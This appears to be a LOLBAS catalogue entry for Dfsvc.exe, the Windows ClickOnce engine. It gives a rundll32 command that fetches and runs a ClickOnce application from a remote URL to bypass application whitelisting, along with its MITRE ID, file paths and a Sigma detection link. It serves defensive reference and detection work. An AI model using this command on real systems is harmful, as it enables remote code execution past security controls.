---
Acknowledgement:
- Person: Casey Sm
Author: Oddvar Moe
Commands:
- Category: AWL Bypass
  Command: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
  Description: Executes click-once-application from Url (trampoline for Dfsvc.exe,
    DotNet ClickOnce host)
  MitreID: T1127.002
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: ClickOnce
  - Execute: Remote
  Usecase: Use binary to bypass Application whitelisting
Created: 2018-05-25
Description: ClickOnce engine in Windows used by .NET
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe
- Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe
Name: Dfsvc.exe
Resources:
- Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- Link: https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe
mitre_data:
  technique_ids:
  - T1127.002
tags:
- lolbas/osbinaries
---

# Dfsvc.exe

ClickOnce engine in Windows used by .NET

# Path(s)

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe`

# AWL Bypass Commands

Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)

```batch
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

- **Usecase:** Use binary to bypass Application whitelisting
- **Privileges Required:** User
- **MitreID:** `T1127.002`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Casey Sm